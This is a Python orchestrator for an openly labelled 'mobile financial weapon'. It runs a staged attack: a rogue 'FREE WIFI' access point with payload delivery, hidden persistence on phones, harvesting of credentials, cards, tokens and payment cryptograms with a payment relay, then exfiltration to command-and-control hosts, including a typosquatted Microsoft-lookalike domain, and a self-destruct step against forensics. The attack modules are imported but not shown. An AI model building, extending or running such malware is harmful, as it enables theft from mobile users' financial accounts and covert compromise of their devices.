#!/usr/bin/env python3
"""
WIFISINNER ULTIMATE — Pegasus-Grade Mobile Financial Weapon

Autonomous, multi-stage cyber-weapon for mobile financial layer compromise.
Orchestrates all phases from initial access to exfiltration and self-destruction.

Cross-platform support:
  - Linux: Full capabilities (native modules)
  - macOS: Compatibility mode (macOS adapter)
  - Android: Termux support (via phase modules)

Architecture:
  Phase 1: Autonomous Access Acquisition
    - Beacon Spoofing (phase1_beacon_spoof.py)
    - OTA Delivery (phase1_ota_delivery.py)
  
  Phase 2: Silent Persistence
    - Privilege Escalation (phase2_persistence.py)
    - Component Registration (phase2_components.py)
  
  Phase 3: Runtime Harvesting
    - Runtime Harvester (phase3_harvester.py)
    - Payment Relay (phase3_relay.py)
  
  Phase 4: Exfiltration & Anti-Forensics
    - C2 Tunneling (phase4_c2.py)
    - Self-Destruct (phase4_selfdestruct.py)
"""

import argparse
import json
import os
import platform
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

# Import clean UI
try:
    from ui_clean import create_ui
except ImportError:
    create_ui = lambda mode="clean": None

# Color output
C_RESET = "\033[0m"
C_DIM = "\033[2m"
C_BOLD = "\033[1m"
C_GREEN = "\033[32m"
C_BGREEN = "\033[1;32m"
C_CYAN = "\033[36m"
C_BCYAN = "\033[1;36m"
C_YELLOW = "\033[33m"
C_BYELLOW = "\033[1;33m"
C_RED = "\033[31m"
C_BRED = "\033[1;31m"
C_MAGENTA = "\033[35m"
C_BMAGENTA = "\033[1;35m"
C_WHITE = "\033[97m"


def now():
    return datetime.now().strftime("%H:%M:%S")


def is_macos():
    """Check if running on macOS"""
    return platform.system() == "Darwin"


def is_linux():
    """Check if running on Linux"""
    return platform.system() == "Linux"


def get_platform():
    """Get current platform"""
    return platform.system()


def get_default_interface():
    """Get default WiFi interface for platform"""
    if is_macos():
        return "en0"
    elif is_linux():
        return "wlan0"
    return "wlan0"


class Stats:
    """Global statistics tracker"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.phase_status = {}
        self.targets = {}
        self.captured = {
            "credentials": 0,
            "cards": 0,
            "tokens": 0,
            "cryptograms": 0
        }
    
    def phase_start(self, phase):
        with self.lock:
            self.phase_status[phase] = {"status": "running", "start": datetime.now()}
    
    def phase_complete(self, phase):
        with self.lock:
            if phase in self.phase_status:
                self.phase_status[phase]["status"] = "complete"
                self.phase_status[phase]["end"] = datetime.now()
    
    def phase_fail(self, phase, reason):
        with self.lock:
            if phase in self.phase_status:
                self.phase_status[phase]["status"] = "failed"
                self.phase_status[phase]["error"] = reason
    
    def target_found(self, mac, info):
        with self.lock:
            self.targets[mac] = {"info": info, "found": datetime.now()}
    
    def capture(self, type, count=1):
        with self.lock:
            self.captured[type] = self.captured.get(type, 0) + count
    
    def get_runtime(self):
        return int(time.time() - self.start_time)


S = Stats()


class WeaponOrchestrator:
    """Main weapon system orchestrator"""
    
    def __init__(self, config=None):
        self.config = config or self._default_config()
        self.active = False
        self.phases = {}
        self.threads = []
        self.macos_adapter = None
        
        # Detect platform
        self.platform = get_platform()
        print(f"[PLATFORM] Detected: {self.platform}")
        
        # Load platform adapter if needed
        if self.platform == "Darwin":
            self._init_macos_adapter()
        
        # Initialize phases
        self._init_phases()
    
    def _default_config(self):
        """Default weapon configuration"""
        return {
            "ssid": "FREE WIFI",
            "channel": 6,
            "iface": "wlan0",
            "c2_dns": "update.micr0soft.com",
            "c2_https": "api.telemetry.com",
            "c2_port": 9999,
            "target_os": "android",
            "auto_start": True,
            "monitoring": True
        }
    
    def _init_macos_adapter(self):
        """Initialize macOS compatibility adapter"""
        print(f"[INIT] Loading macOS adapter...")
        
        try:
            from macos_adapter import MacOSAdapter
            self.macos_adapter = MacOSAdapter()
            self.macos_adapter.wifi.iface = self.config["iface"]
            print(f"[INIT] ✓ macOS adapter loaded")
        except ImportError as e:
            print(f"[INIT] ! macOS adapter import warning: {e}")
            self.macos_adapter = None
    
    def _init_phases(self):
        """Initialize all phase modules"""
        print(f"[INIT] Loading phase modules...")
        
        try:
            # Phase 1: Access
            from phase1_beacon_spoof import BeaconSpoof, TargetRecon
            from phase1_ota_delivery import OTADeliveryServer
            self.phases["access"] = {
                "beacon": BeaconSpoof(iface=self.config["iface"], channel=self.config["channel"]),
                "recon": TargetRecon(),
                "ota": OTADeliveryServer(port=80)
            }
            print(f"[INIT] ✓ Phase 1 modules loaded")
        except ImportError as e:
            print(f"[INIT] ! Phase 1 import warning: {e}")
        
        try:
            # Phase 2: Persistence
            from phase2_persistence import PersistenceDaemon
            from phase2_components import ComponentRegistration
            self.phases["persistence"] = {
                "daemon": PersistenceDaemon(self.config["target_os"]),
                "components": ComponentRegistration()
            }
            print(f"[INIT] ✓ Phase 2 modules loaded")
        except ImportError as e:
            print(f"[INIT] ! Phase 2 import warning: {e}")
        
        try:
            # Phase 3: Harvesting
            from phase3_harvester import RuntimeHarvester
            from phase3_relay import PaymentRelaySystem
            self.phases["harvesting"] = {
                "harvester": RuntimeHarvester(),
                "relay": PaymentRelaySystem(c2_host="10.0.0.1", c2_port=self.config["c2_port"])
            }
            print(f"[INIT] ✓ Phase 3 modules loaded")
        except ImportError as e:
            print(f"[INIT] ! Phase 3 import warning: {e}")
        
        try:
            # Phase 4: Exfiltration
            from phase4_c2 import C2Channel
            from phase4_selfdestruct import SelfDestruct
            self.phases["exfil"] = {
                "c2": C2Channel(dns_domain=self.config["c2_dns"], https_host=self.config["c2_https"]),
                "destruct": SelfDestruct()
            }
            print(f"[INIT] ✓ Phase 4 modules loaded")
        except ImportError as e:
            print(f"[INIT] ! Phase 4 import warning: {e}")
    
    def start(self):
        """Start the weapon system"""
        print(f"\n{'='*70}")
        print(f"{C_BMAGENTA}WIFISINNER ULTIMATE{C_RESET} — Pegasus-Grade Mobile Financial Weapon")
        print(f"{C_DIM}Autonomous Multi-Stage Cyber-Weapon System{C_RESET}")
        print(f"{'='*70}\n")
        
        self.active = True
        
        # Phase 1: Autonomous Access Acquisition
        print(f"\n{C_BCYAN}[PHASE 1]{C_RESET} Autonomous Access Acquisition")
        print(f"{C_DIM}{'─'*60}{C_RESET}")
        S.phase_start("phase1")
        
        self._run_phase1()
        
        if S.phase_status.get("phase1", {}).get("status") == "running":
            S.phase_complete("phase1")
        
        # Phase 2: Silent Persistence
        print(f"\n{C_BCYAN}[PHASE 2]{C_RESET} Silent Persistence & Sandbox Escape")
        print(f"{C_DIM}{'─'*60}{C_RESET}")
        S.phase_start("phase2")
        
        self._run_phase2()
        
        if S.phase_status.get("phase2", {}).get("status") == "running":
            S.phase_complete("phase2")
        
        # Phase 3: Runtime Harvesting
        print(f"\n{C_BCYAN}[PHASE 3]{C_RESET} Runtime Harvesting & Wallet Instrumentation")
        print(f"{C_DIM}{'─'*60}{C_RESET}")
        S.phase_start("phase3")
        
        self._run_phase3()
        
        if S.phase_status.get("phase3", {}).get("status") == "running":
            S.phase_complete("phase3")
        
        # Phase 4: Exfiltration & Anti-Forensics
        print(f"\n{C_BCYAN}[PHASE 4]{C_RESET} Encrypted Exfiltration & Self-Destruct")
        print(f"{C_DIM}{'─'*60}{C_RESET}")
        S.phase_start("phase4")
        
        self._run_phase4()
        
        if S.phase_status.get("phase4", {}).get("status") == "running":
            S.phase_complete("phase4")
        
        # Final summary
        self._print_summary()
    
    def _run_phase1(self):
        """Execute Phase 1: Access Acquisition"""
        try:
            if self.platform == "Darwin" and self.macos_adapter:
                # macOS compatibility mode
                print(f"{C_CYAN}[1.1]{C_RESET} macOS mode: Scanning networks...")
                
                networks = self.macos_adapter.wifi.scan_networks()
                print(f"{C_BGREEN}[+]{C_RESET} Found {len(networks)} networks")
                for net in networks[:5]:
                    print(f"       {net.get('ssid', 'Unknown')}")
                
                print(f"{C_CYAN}[1.2]{C_RESET} macOS mode: Starting OTA server...")
                self.macos_adapter.ota.start_server()
                
                print(f"{C_CYAN}[1.3]{C_RESET} macOS mode: Starting probe sniffer...")
                self.macos_adapter.sniffer.start_sniffing()
                
                time.sleep(5)
                
                if self.macos_adapter.sniffer.probes:
                    print(f"{C_BGREEN}[+]{C_RESET} Captured {len(self.macos_adapter.sniffer.probes)} probe(s)")
                
                print(f"{C_YELLOW}[!] macOS: Full beacon spoofing limited. Use Linux for complete features.{C_RESET}")
                
            elif "access" in self.phases:
                # Linux native mode
                print(f"{C_CYAN}[1.1]{C_RESET} Starting beacon spoofing engine...")
                self.phases["access"]["beacon"].start()
                time.sleep(2)
                
                print(f"{C_CYAN}[1.2]{C_RESET} Starting OTA delivery server...")
                self.phases["access"]["ota"].start()
                
                print(f"{C_CYAN}[1.3]{C_RESET} Scanning for targets...")
                time.sleep(3)
                
                targets = self.phases["access"]["beacon"].get_targets()
                if targets:
                    print(f"{C_BGREEN}[+]{C_RESET} Found {len(targets)} target(s)")
                    for mac, data in targets.items():
                        S.target_found(mac, {"probes": data["count"], "signal": data["signal"]})
                        print(f"       {mac}: {data['count']} probes, {data['signal']}dBm")
                
                time.sleep(5)
            else:
                print(f"{C_YELLOW}[!] Phase 1 not available (imports failed){C_RESET}")
            
            print(f"{C_BGREEN}[✓]{C_RESET} Phase 1 complete")
            
        except Exception as e:
            print(f"{C_BRED}[!]{C_RESET} Phase 1 error: {e}")
            S.phase_fail("phase1", str(e))
    
    def _run_phase2(self):
        """Execute Phase 2: Persistence"""
        if "persistence" not in self.phases:
            print(f"{C_YELLOW}[!] Phase 2 not available (imports failed){C_RESET}")
            return
        
        try:
            # Start persistence daemon
            print(f"{C_CYAN}[2.1]{C_RESET} Establishing persistence...")
            self.phases["persistence"]["daemon"].start()
            time.sleep(2)
            
            # Register invisible components
            print(f"{C_CYAN}[2.2]{C_RESET} Registering invisible components...")
            self.phases["persistence"]["components"].start()
            time.sleep(2)
            
            print(f"{C_BGREEN}[✓]{C_RESET} Phase 2 complete")
            
        except Exception as e:
            print(f"{C_BRED}[!]{C_RESET} Phase 2 error: {e}")
            S.phase_fail("phase2", str(e))
    
    def _run_phase3(self):
        """Execute Phase 3: Harvesting"""
        if "harvesting" not in self.phases:
            print(f"{C_YELLOW}[!] Phase 3 not available (imports failed){C_RESET}")
            return
        
        try:
            # Start runtime harvester
            print(f"{C_CYAN}[3.1]{C_RESET} Starting runtime harvester...")
            self.phases["harvesting"]["harvester"].start()
            time.sleep(2)
            
            # Start payment relay
            print(f"{C_CYAN}[3.2]{C_RESET} Starting payment relay system...")
            self.phases["harvesting"]["relay"].start()
            time.sleep(3)
            
            print(f"{C_BGREEN}[✓]{C_RESET} Phase 3 complete")
            
        except Exception as e:
            print(f"{C_BRED}[!]{C_RESET} Phase 3 error: {e}")
            S.phase_fail("phase3", str(e))
    
    def _run_phase4(self):
        """Execute Phase 4: Exfiltration"""
        if "exfil" not in self.phases:
            print(f"{C_YELLOW}[!] Phase 4 not available (imports failed){C_RESET}")
            return
        
        try:
            # Start C2 channel
            print(f"{C_CYAN}[4.1]{C_RESET} Establishing C2 channel...")
            self.phases["exfil"]["c2"].start()
            time.sleep(2)
            
            # Start anti-forensics monitoring
            print(f"{C_CYAN}[4.2]{C_RESET} Starting anti-forensics monitoring...")
            self.phases["exfil"]["destruct"].start_monitoring()
            
            # Run for a while
            time.sleep(5)
            
            print(f"{C_BGREEN}[✓]{C_RESET} Phase 4 complete")
            
        except Exception as e:
            print(f"{C_BRED}[!]{C_RESET} Phase 4 error: {e}")
            S.phase_fail("phase4", str(e))
    
    def _print_summary(self):
        """Print operation summary"""
        print(f"\n{'='*70}")
        print(f"{C_BMAGENTA}OPERATION SUMMARY{C_RESET}")
        print(f"{'='*70}\n")
        
        # Phase status
        print(f"{C_BOLD}Phase Status:{C_RESET}")
        for phase, status in S.phase_status.items():
            if status["status"] == "complete":
                print(f"  {C_BGREEN}[✓]{C_RESET} {phase}")
            elif status["status"] == "running":
                print(f"  {C_BGREEN}[✓]{C_RESET} {phase}")
            elif status["status"] == "failed":
                print(f"  {C_BRED}[!]{C_RESET} {phase}: {status.get('error', 'unknown')}")
            else:
                print(f"  {C_DIM}[?]{C_RESET} {phase}")
        
        # Targets found
        print(f"\n{C_BOLD}Targets Found:{C_RESET} {len(S.targets)}")
        for mac, info in list(S.targets.items())[:5]:
            print(f"  {mac}: {info['info']}")
        
        # Captured data
        print(f"\n{C_BOLD}Data Captured:{C_RESET}")
        print(f"  Credentials: {S.captured.get('credentials', 0)}")
        print(f"  Cards: {S.captured.get('cards', 0)}")
        print(f"  Tokens: {S.captured.get('tokens', 0)}")
        print(f"  Cryptograms: {S.captured.get('cryptograms', 0)}")
        
        # Runtime
        print(f"\n{C_BOLD}Runtime:{C_RESET} {S.get_runtime()}s")
        
        print(f"\n{'='*70}")
    
    def stop(self):
        """Stop the weapon system"""
        print(f"\n{C_CYAN}[*]{C_RESET} Shutting down...")
        self.active = False
        
        # Stop phases in reverse order
        print(f"[STOP] Phase 4...")
        if "exfil" in self.phases:
            self.phases["exfil"]["c2"].stop()
            self.phases["exfil"]["destruct"].manual_wipe()
            self.phases["exfil"]["destruct"].stop()
        
        print(f"[STOP] Phase 3...")
        if "harvesting" in self.phases:
            self.phases["harvesting"]["relay"].stop()
            self.phases["harvesting"]["harvester"].stop()
        
        print(f"[STOP] Phase 2...")
        if "persistence" in self.phases:
            self.phases["persistence"]["daemon"].stop()
            self.phases["persistence"]["components"].stop()
        
        print(f"[STOP] Phase 1...")
        if "access" in self.phases:
            self.phases["access"]["beacon"].stop()
            self.phases["access"]["ota"].stop()
        
        # Stop macOS adapter if active
        if self.macos_adapter:
            print(f"[STOP] macOS adapter...")
            self.macos_adapter.stop_operation()
        
        print(f"{C_BGREEN}[✓]{C_RESET} Shutdown complete")


def main():
    parser = argparse.ArgumentParser(
        description="WIFISINNER ULTIMATE — Pegasus-Grade Mobile Financial Weapon",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wifisinner_ultimate.py              # Full autonomous operation
  sudo python3 wifisinner_ultimate.py --scan       # Scan for targets only
  sudo python3 wifisinner_ultimate.py --phase 1    # Run only Phase 1
  sudo python3 wifisinner_ultimate.py --dry-run    # Show what would happen
        """
    )
    
    parser.add_argument("--iface", default=None, help="WiFi interface (default: auto-detect)")
    parser.add_argument("--ssid", default="FREE WIFI", help="Honeypot SSID")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel (macOS limited)")
    parser.add_argument("--c2-dns", default="update.micr0soft.com", help="C2 DNS domain")
    parser.add_argument("--c2-https", default="api.telemetry.com", help="C2 HTTPS host")
    parser.add_argument("--c2-port", type=int, default=9999, help="C2 port")
    parser.add_argument("--target-os", choices=["android", "ios"], default="android", help="Target OS")
    parser.add_argument("--scan", action="store_true", help="Scan for targets only")
    parser.add_argument("--phase", type=int, choices=[1, 2, 3, 4], help="Run specific phase only")
    parser.add_argument("--dry-run", action="store_true", help="Show configuration without running")
    parser.add_argument("--config", help="Load config from JSON file")
    parser.add_argument("--macos-adapter", action="store_true", help="Force macOS adapter mode")
    
    args = parser.parse_args()
    
    # Load config
    config = None
    if args.config:
        try:
            config = json.loads(Path(args.config).read_text())
        except:
            print(f"{C_YELLOW}[!] Failed to load config: {args.config}{C_RESET}")
    
    # Create orchestrator
    weapon = WeaponOrchestrator(config)
    
    # Override config with CLI args
    weapon.config["iface"] = args.iface or get_default_interface()
    weapon.config["ssid"] = args.ssid
    weapon.config["channel"] = args.channel
    weapon.config["c2_dns"] = args.c2_dns
    weapon.config["c2_https"] = args.c2_https
    weapon.config["c2_port"] = args.c2_port
    weapon.config["target_os"] = args.target_os
    
    # Force macOS adapter if requested
    if args.macos_adapter and weapon.platform != "Darwin":
        print(f"{C_YELLOW}[!] --macos-adapter specified but not on macOS{C_RESET}")
    
    if args.dry_run:
        print(f"\n{C_BOLD}Configuration:{C_RESET}")
        print(f"  Platform: {get_platform()}")
        for key, value in weapon.config.items():
            print(f"  {key}: {value}")
        
        print(f"\n{C_BOLD}Platform Support:{C_RESET}")
        if is_macos():
            print(f"  {C_GREEN}✓ macOS: Compatibility mode enabled{C_RESET}")
            print(f"    Features: Network scanning, OTA delivery, probe sniffing")
            print(f"    Limitations: Beacon spoofing limited (use Linux for full features)")
        else:
            print(f"  {C_GREEN}✓ Linux: Full native support{C_RESET}")
            print(f"    Features: All 4 phases with complete capabilities")
        
        print(f"\n{C_BOLD}Phases:{C_RESET}")
        print(f"  Phase 1: Beacon Spoofing + OTA Delivery")
        print(f"  Phase 2: Persistence + Component Registration")
        print(f"  Phase 3: Runtime Harvesting + Payment Relay")
        print(f"  Phase 4: C2 Tunneling + Self-Destruct")
        
        print(f"\n{C_BGREEN}Ready to engage.{C_RESET}")
        sys.exit(0)
    
    if args.scan:
        print(f"\n{C_BCYAN}[SCAN]{C_RESET} Scanning for targets...")
        
        if is_macos():
            # macOS scan
            if weapon.macos_adapter:
                networks = weapon.macos_adapter.wifi.scan_networks()
                print(f"\nFound {len(networks)} network(s):")
                for net in networks[:15]:
                    print(f"  {net.get('ssid', 'Unknown')}")
        elif "access" in weapon.phases:
            # Linux scan
            weapon.phases["access"]["beacon"].start()
            time.sleep(5)
            targets = weapon.phases["access"]["beacon"].get_targets()
            print(f"\nFound {len(targets)} target(s):")
            for mac, data in targets.items():
                print(f"  {mac}: {data['count']} probes, {data['signal']}dBm")
            weapon.phases["access"]["beacon"].stop()
        
        sys.exit(0)
    
    if args.phase:
        print(f"\n{C_BCYAN}[PHASE {args.phase}]{C_RESET} Running phase only...")
        # Run specific phase
        if args.phase == 1:
            weapon._run_phase1()
        elif args.phase == 2:
            weapon._run_phase2()
        elif args.phase == 3:
            weapon._run_phase3()
        elif args.phase == 4:
            weapon._run_phase4()
        weapon._print_summary()
        sys.exit(0)
    
    # Full operation
    try:
        weapon.start()
    except KeyboardInterrupt:
        print(f"\n{C_CYAN}[*]{C_RESET} Interrupted")
    finally:
        weapon.stop()


if __name__ == "__main__":
    main()
